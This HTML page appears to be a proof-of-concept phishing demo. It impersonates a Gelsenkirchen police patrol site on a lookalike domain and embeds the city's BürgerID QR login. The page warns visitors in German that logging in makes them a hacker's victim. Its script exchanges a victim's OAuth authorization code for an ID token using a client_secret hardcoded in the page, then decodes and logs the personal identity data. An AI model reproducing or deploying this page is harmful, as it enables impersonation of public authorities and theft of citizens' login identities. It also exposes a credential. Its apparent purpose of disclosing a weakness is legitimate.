<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>xignin</title>
    <script src="https://xignsys.gelsenkirchen.de/js/xignqr-jslogin.umd.min.js"></script>
</head>
<body>
<h1>Nicht die ðŸ‘®POLIZEI-StreifeðŸ‘® Gelsenkirchen</h1>
<p>Bitte melden Sie sich hier auf keinen Fall an, um ihren Strafzettel einzusehen, dann werden sie nÃ¤mlich Opfer einer
    Hackerin.</p>
<div id="xignin"></div>
<script type="application/javascript">

    //this is not how jwt works - please never implement it like this; just demo;
    // taken from https://stackoverflow.com/a/38552302
    function parseJwt(token) {
        var base64Url = token.split('.')[1];
        var base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
        var jsonPayload = decodeURIComponent(atob(base64).split('').map(function (c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(''));

        return JSON.parse(jsonPayload);
    };

    //this is not how oauth works - please never implement it like this; just demo
    function oauthDone(code) {
        console.log(code);
        fetch("https://xignsys.gelsenkirchen.de/openid/token", {
            method: "POST",
            body: "grant_type=authorization_code&code=" + code + "&redirect_uri=https://gelsenkirchen.polizei-streife.de/&client_id=c8c5c598-4c16-4954-b206-2323f221d172&client_secret=QmWrp/2t1kpPFoL1cyMuuUoUeAbD5A8Nj7hqTVF8iBc=",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded; charset=utf-8"
            },
            credentials: "same-origin"
        }).then(function (response) {
            console.log(response.status);
            console.log(response.statusText);
            console.log(response.headers);
            console.log(response.url);
            return response.json();
        }).then(function (json) {
            console.log(parseJwt(json["id_token"]))
        })
            .catch(function (error) {
                console.log(error.message);
            })

    }

    const config = {
        placeholder: {appName: "B\xfcrgerID"},
        managerUri: "https://xignsys.gelsenkirchen.de",
        containerId: "xignin",
        clientId: "c8c5c598-4c16-4954-b206-2323f221d172",
        mode: XignQRLogin.XignLoginMode.PULL_TOKEN,
        redirectUri: "https://gelsenkirchen.polizei-streife.de/",
        useSSO: !1,
        onAuthentication: oauthDone
    };
    new XignQRLogin.XignQRLogin(config).start()
</script>
<style type="text/css">
    h1 {
        font-family: Comic Sans MS, Verdana, Helvetica;
    }
</style>
</body>
</html>
